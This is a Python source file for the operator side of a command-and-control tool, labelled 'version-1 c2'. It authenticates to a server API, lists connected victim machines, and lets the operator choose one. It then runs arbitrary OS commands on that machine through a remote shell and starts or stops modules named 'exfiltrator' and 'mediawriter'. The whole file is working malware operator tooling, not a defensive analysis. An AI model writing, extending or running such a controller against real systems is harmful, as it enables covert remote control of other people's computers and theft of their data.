import sys
import shlex
import hashlib
from enum import Enum

from modelmapper import *
from httpclient import *

enumerate

options = ["-api", "-email", "-password"]
commands = ["help", "stop", "start", "shell", "timeout"]
modules = ["mediawriter", "exfiltrator"]

httpClient = None  
listeners = None
is_shell = False
target_index = -1

def usage():
    print("Usage:\n\t program.py -api <api_url> -email <auth_email> -password <auth_password>\n")
    print("Options:")
    print("-api          The url of the API (ie. http://127.0.0.1:5014)")
    print("-email        The email address to authenticate a session with.")
    print("-password     The password to authenticate a session with.")
    print()
    sys.exit()

def command_help():
    print()
    print("Available commands")
    print("="*50)
    print("help                    Display this text.")
    print("start <module_name>     Starts up the module specified by <module_name> on the target machine.")
    print("stop <module_name>      Stops all instances of the module specified by <module_name> running on the target.")
    print("target [<index>]        Specified without <index> this command lists all targets available for issuing a command to. "
          "When specified with <index>, all subsequent commands will be directed at the target specified by <index>.")
    print("shell                   Execute OS commands on the selected target.")
    print("timeout <int>           Sets the timeout for all requests to <int>, a non-negative whole number. Minimum 15.")
    print()


def validate_cmd(command_str: str):
    command_str = command_str.strip()
    if not len(command_str) > 0:
        return False
    
    command = shlex.split(command_str)
    match command[0]:
        case "start":
            if not command[1] in modules:
                print(f"Invalid module for {command[0]} command.")
                return False

        case "stop":
            if not command[1] in modules:
                print(f"Invalid module for {command[0]} command.")
                return False 
        
        case _:
            print(f"Unrecognised command {command_str}. Type 'help' for list of commands.")
            return False
        
    return True


def safe_read(option: str, argv: list[str]):
    if not option in argv:
        print("Not all mandatory arguments were specified.")
        usage()

    value_index = argv.index(option) + 1
    if value_index > len(argv):
        print("Insufficient arguments.")
        usage()

    value = argv[value_index]
    if value in options:
        print(f"Expected value for option {option}, but option found.")
        usage()

    return value

def display_listeners(session_token):
    global listeners
    listeners = httpClient.api_get_listeners(session_token)

    print()
    print("Index\t Token\t\t Username")
    print("-"*50)
    index = 0
    for connection in listeners:
        if index == target_index: # show selected target
            print(f"{index}\t {connection['id']}\t{connection['clientName']}\t < target >") 
        else:
            print(f"{index}\t {connection['id']}\t{connection['clientName']}")
        index += 1
    print()

def command_target(session_token, command_str: str, curr_target: int):
    command = shlex.split(command_str.strip())
    if len(command) == 1:
        display_listeners(session_token)

    target = curr_target
    if len(command) > 1:
        target = int(command[1]) if command[1].isnumeric() else -1
        if not target in range(0, len(listeners)):
            print(f"Invalid target selection {target}. Try updating list with by typing 'target'.")
            target = curr_target

    return target 

def command_timeout(command_str: str):
    command = shlex.split(command_str.strip())
    if command[0] != "timeout":
        print(f"Unrecognised command {command_str}. Type 'help' for list of commands.")
        return httpClient.std_timeout
    
    if not len(command) > 1:
        print("No timeout value provided.")
        return httpClient.std_timeout
    
    elif not command[1].isnumeric():
        print(f"Invalid timeout value '{command[1]}'.")
        return httpClient.std_timeout
    
    if int(command[1]) < 15:
        print("Minimum timeout is 15 seconds.")
        return httpClient.std_timeout
    
    return int(command[1])

def prompt(session_token: str):
    global is_shell
    global target_index

    while True:
        try:
            command_str = input("<version-1 c2>: " if not is_shell else "<shell> ")

            if not is_shell and command_str.lower() == "exit":
                terminate()

            if not is_shell and command_str.lower() == "help": 
                command_help()
                continue

            if not is_shell and command_str.lower().startswith("target"):
                target_index = command_target(session_token, command_str, target_index)
                continue

            if not is_shell and command_str.lower().startswith("timeout"):
                timeout = command_timeout(command_str)
                httpClient.set_timeout(timeout)
                continue

            # following execution requires valid id to be set
            if not target_index >= 0:
                print("Select a valid target first. \n")
                display_listeners(session_token)
                continue

            if not is_shell and command_str.lower() == "shell":
                is_shell = True
                continue

            if is_shell and command_str.lower() == "exit":
                is_shell = False
                continue
            
            if is_shell and len(command_str.strip()) > 0:
                result = httpClient.api_submit_cmd(session_token, listeners[target_index]["id"] , True, command_str)
                print(f"\n{result}\n")

            else:
                valid = validate_cmd(command_str)
                if(not valid):
                    continue 
        
                result = httpClient.api_submit_cmd(session_token, listeners[target_index]["id"], False, command_str)
                print(f"\n{result}\n")

        except KeyboardInterrupt:
            terminate()

        except Exception as ex:
            print("Unexpected error while processing command.")
            
            

def main():
    global httpClient

    api_baseURL = safe_read("-api", sys.argv)
    email = safe_read("-email", sys.argv)
    password = hashlib.sha256( bytes(safe_read("-password", sys.argv), "utf-8") ).hexdigest()

    httpClient = HttpClient(api_baseURL)
    authenticated, session_token = httpClient.api_authenticate(email, password)

    if(not authenticated):
        print("Failed to authenticate.")
        return
    
    prompt(session_token)


def terminate():
    print("\nBye bye!")
    sys.exit()

if __name__=="__main__":
    main()